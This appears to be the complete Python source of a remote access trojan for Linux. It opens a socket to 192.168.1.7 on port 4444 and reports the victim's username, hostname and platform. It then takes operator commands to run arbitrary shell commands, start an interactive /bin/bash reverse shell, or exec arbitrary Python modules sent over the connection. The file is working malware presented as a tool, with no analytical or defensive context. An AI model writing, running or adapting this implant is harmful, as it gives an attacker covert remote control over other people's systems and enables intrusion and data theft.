import socket
import getpass
import platform
import threading
import subprocess

class Request:
    def __init__(self):
        self.conn = None
        self.header_separator = b"||"
        self.header = b""
        self.data = b""

    def set_conn(self, conn):
        self.conn = conn

    def set_header_separator(self, seperator):
        self.header_separator = seperator if isinstance(seperator, bytes) else seperator.encode()

    def set_header(self, header):
        self.header = header if isinstance(header, bytes) else header.encode()

    def set_data(self, data, binary=False):
        self.data = data if binary else data.encode()

    def get_header_separator(self):
        return self.header_separator

    def get_header(self):
        return self.header

    def get_data(self, binary=False):
        return self.data if binary else self.data.decode(errors="ignore")

    def send(self):
        sep = self.header_separator
        header = self.header
        data = self.data
        
        payload = data
        if header:
            payload = header + payload
        length = f"{len(payload):<10}".encode()
        self.conn.sendall(length + payload)

    def recv(self, binary=False):
        raw_length = self._recv_n_bytes(10)
        if not raw_length:
            return False

        try:
            length = int(raw_length.strip())
        except ValueError:
            print("Invalid length header.")
            return False

        body = self._recv_n_bytes(length)
        if not body:
            return False

        parts = body.split(self.header_separator, 1)

        header = b""
        
        if len(parts) == 2:
            header, data = parts
        elif len(parts) == 1:
            data = parts[0]
            
        self.header = header if binary else header.decode(errors="ignore")
        self.data = data if binary else data.decode(errors="ignore")
        return True

    def _recv_n_bytes(self, n):
        buffer = b""
        while len(buffer) < n:
            chunk = self.conn.recv(n - len(buffer))
            if not chunk:
                return None
            buffer += chunk
        return buffer
    
    def close(self):
        self.conn.close()
        
def send_data(conn, data, header=None, header_separator=None,  binary=False):
    try:
        req = Request()
        req.set_conn(conn)
        if header_separator:
            req.set_header_separator(header_separator)
        if header:
            req.set_header(header)
        req.set_data(data,binary)
        req.send()
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        close(conn)
        
def recv_data(conn, binary=False):
    try:
        req = Request()
        req.set_conn(conn)
        req.recv(binary)
        return req.header, req.data
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        close(conn)
        
def close(conn):
    req = Request()
    req.set_conn(conn)
    req.close()

class PersistentShell:
    def __init__(self):
        self.process = subprocess.Popen(
            ["/bin/bash"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        self.output = ""
        self.lock = threading.Lock()
        self.marker = "__END__MARKER__"
        self.command_done = threading.Event()
        self._start_reader()
        self.closed = False

    def _start_reader(self):
        def read_output():
            buffer = ""
            for line in self.process.stdout:
                if line.startswith("PS "):
                    continue
                buffer += line
                if self.marker in line:
                    with self.lock:
                        self.output = buffer.replace(self.marker, "").strip()
                        buffer = ""
                    self.command_done.set()
        threading.Thread(target=read_output, daemon=True).start()

    def execute(self, cmd: str) -> str:
        if self.closed:
            return "Shell already closed"

        if cmd.strip().lower() == "exit":
            self.process.stdin.write("exit\n")
            self.process.stdin.flush()
            self.process.wait()
            self.closed = True
            return "Shell closed"

        with self.lock:
            self.output = ""
        self.command_done.clear()

        full_cmd = f"{cmd}; echo {self.marker}"
        try:
            self.process.stdin.write(full_cmd + "\n")
            self.process.stdin.flush()
        except Exception as e:
            return f"Failed to write command: {e}"

        self.command_done.wait()
        with self.lock:
            return self.output

def execute(cmd) -> str:
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, executable="/bin/bash")
    except subprocess.CalledProcessError as e:
        result = e.output
    return result.decode()

def shell(conn):
    shell = PersistentShell()
    
    while True:
        response = None
        _, cmd = recv_data(conn)
        
        response = "\n" + shell.execute(cmd) + "\n\n"
        if cmd == "exit":
            break
        
        if not response:
            response = "\n"
        send_data(conn, response)
        
    return response.strip("\n")

def get_system_info():
    username = getpass.getuser()        
    hostname = socket.gethostname()     
    os_type = platform.system().lower() 
    arch = platform.machine().lower()   

    if arch in ["amd64", "x86_64"]:
        arch = "x64"
    elif "arm" in arch:
        arch = "arm"

    return f"||{username}||{hostname}||{os_type}-{arch}"

def execute_module(module):

    namespace = {}
    
    obj = compile(module, "<string>", "exec")
    exec(obj, namespace)

    response = namespace["result"]
    return response


def main():
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect(("192.168.1.7", 4444))
    send_data(conn,get_system_info())
    while True:
        response = None
        header, cmd = recv_data(conn)
        
        if header:
            match header:
                case "CMD":
                    response = execute(cmd)
                case "SHELL":
                    response = shell(conn)
                case "MODULE":
                    response = execute_module(cmd)
                case _:
                    pass

        if not response:
            response = "\n"
        send_data(conn, response)
            
     
if __name__ == "__main__":
    main()